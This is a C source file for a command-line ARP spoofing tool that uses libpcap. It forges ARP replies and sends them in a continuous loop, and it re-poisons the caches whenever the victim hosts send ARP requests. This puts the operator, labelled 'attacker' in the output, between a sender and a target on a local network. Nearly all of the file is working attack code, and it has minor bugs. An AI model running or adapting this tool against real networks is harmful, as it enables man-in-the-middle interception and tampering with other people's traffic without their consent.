#include "arp_spoof.h"

void usage(void)
{
    printf("syntax : arp-spoof <interface> <sender ip> <target ip>\n");
    printf("syntax : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
    return;
}

void get_ip(char *my_IP_char, char *interface)
{
    int n;
    struct ifreq ifr;
    n = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
    strcpy(my_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    return;
}

void print_ip(char *IP_char)
{
    printf("%s", IP_char);
    return;
}

void get_mac(uint8_t *my_mac, char *interface)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, interface);
    if(!ioctl(fd, SIOCGIFHWADDR,&s))
    {
       memcpy(my_mac, s.ifr_addr.sa_data, 6*sizeof(uint8_t)); 
    }
    return;
}

void print_mac(uint8_t *mac)
{
    for(int i=0; i<6; i++)
        if(i)
            printf(":%02x", mac[i]);
    return;
}

void arp_request(eth_header *arp, uint8_t *src_mac, uint32_t src_IP, uint32_t dst_IP)
{
    memset(arp->DMAC, 0xFF, 6*sizeof(uint8_t));
    memcpy(arp->SMAC, src_mac, 6*sizeof(uint8_t));
    arp->ETHTYPE = htons(ETHERTYPE_ARP);

    (arp->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
    (arp->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
    (arp->ARPHDR).HLEN = ARP_HLEN_ETH;
    (arp->ARPHDR).PLEN = ARP_PLEN_IP;
    (arp->ARPHDR).OPER = htons(ARPOP_REQUEST);
    memcpy((arp->ARPHDR).sender_h, src_mac, 6*sizeof(uint8_t));
    (arp->ARPHDR).sender_p = src_IP;
    memset((arp->ARPHDR).target_h, 0x00, 6*sizeof(uint8_t));
    (arp->ARPHDR).target_p = dst_IP;
    return;
}

void arp_reply(eth_header *arp, uint8_t *src_mac, uint8_t *dst_mac, uint32_t dst_IP, uint32_t target_IP)
{
    memcpy(arp->DMAC, dst_mac, 6*sizeof(uint8_t));
    memcpy(arp->SMAC, src_mac, 6*sizeof(uint8_t));
    arp->ETHTYPE = htons(ETHERTYPE_ARP);

    (arp->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
    (arp->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
    (arp->ARPHDR).HLEN = ARP_HLEN_ETH;
    (arp->ARPHDR).PLEN = ARP_PLEN_IP;
    (arp->ARPHDR).OPER = htons(ARPOP_REPLY);
    memcpy((arp->ARPHDR).sender_h, src_mac, 6*sizeof(uint8_t));
    (arp->ARPHDR).sender_p = target_IP;
    memcpy((arp->ARPHDR).target_h, dst_mac, 6*sizeof(uint8_t));
    (arp->ARPHDR).target_p = dst_IP;
    return;
}

bool get_sendermac(uint8_t *sender_mac, int sender_IP, pcap_t *handle, struct pcap_pkthdr *hdr, const uint8_t *pkt)
{
    time_t start = time(NULL);
    while(1)
    {
        if(time(NULL) > start + 3)
            break;
        int res = pcap_next_ex(handle, &hdr, &pkt);
        if(res == 0)
            continue;
        if(res == -1 || res == -2)
            break;
        
        uint16_t PKT_ETHERTYPE = ntohs(((eth_header *)pkt)->ETHTYPE);
        if(PKT_ETHERTYPE != ETHERTYPE_ARP)
            continue;

        uint16_t PKT_ARPOP = ntohs((((eth_header *)pkt)->ARPHDR).OPER);
        if(PKT_ARPOP != ARPOP_REPLY)
            continue;
        
        uint32_t PKT_ARPSPA = (((eth_header *)pkt)->ARPHDR).sender_p;
        if(PKT_ARPSPA != sender_IP)
            continue;

        memcpy(sender_mac, (((eth_header *)pkt)->ARPHDR).sender_h, 6*sizeof(uint8_t));
        return 1;
    }
}

void *arp_send(void *info)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(((arguments *)info)->dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", ((arguments *)info)->dev, errbuf);
        exit(EXIT_FAILURE);
    }
    while(1)
    {
        if(pcap_sendpacket(handle, ((arguments *)info)->reply_sender, sizeof(eth_header)))
            pcap_perror(handle, (char*)"[- PROD -] pcap_sendpacket error");
        else
            puts("[ PROD ] sender <- attacker    target");
        if(pcap_sendpacket(handle, ((arguments *)info)->reply_target, sizeof(eth_header)))
            pcap_perror(handle, (char *)"[- PROD -] pcap_sendpacket error");
        else
            puts("[ PROD ] sender    attacker -> target");      
    }
    return NULL;

}

void *block(void *info)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(((arguments *)info)->dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", ((arguments *)info)->dev, errbuf);
		exit(EXIT_FAILURE);
	}	
	
	struct pcap_pkthdr *hdr = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t *pkt;
	
	while (1)
	{
		int res = pcap_next_ex(handle, &hdr, &pkt);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { exit(EXIT_FAILURE); }

		uint16_t PKT_ETHERTYPE = ntohs(((eth_header *)pkt)->ETHTYPE);
		if (PKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PKT_ARPOP = ntohs((((eth_header *)pkt)->ARPHDR).OPER);
		if (PKT_ARPOP != ARPOP_REQUEST) { continue; }

		uint32_t PKT_ARPSPA = (((eth_header *)pkt)->ARPHDR).sender_p;
		uint32_t PKT_ARPTPA = (((eth_header *)pkt)->ARPHDR).target_p;
		
		if ((PKT_ARPSPA == ((arguments *)info)->sender_IP) && (PKT_ARPTPA == ((arguments *)info)->target_IP))
		{
			if (pcap_sendpacket(handle, ((arguments *)info)->reply_sender, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
			else { puts("[  RINF  ] sender <- attacker    target"); }
			if (pcap_sendpacket(handle, ((arguments *)info)->reply_target, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
			else { puts("[  RINF  ] sender    attacker -> target"); }
			continue;
		}

		if ((PKT_ARPSPA == ((arguments *)info)->target_IP) && (PKT_ARPTPA == ((arguments *)info)->sender_IP))
		{
			if (pcap_sendpacket(handle, ((arguments *)info)->reply_target, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
			else { puts("[  RINF  ] sender    attacker -> target"); }
			if (pcap_sendpacket(handle, ((arguments *)info)->reply_sender, sizeof(eth_header))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
			else { puts("[  RINF  ] sender <- attacker    target"); }
			continue;
		}
	}

	free(hdr);

	return NULL;
}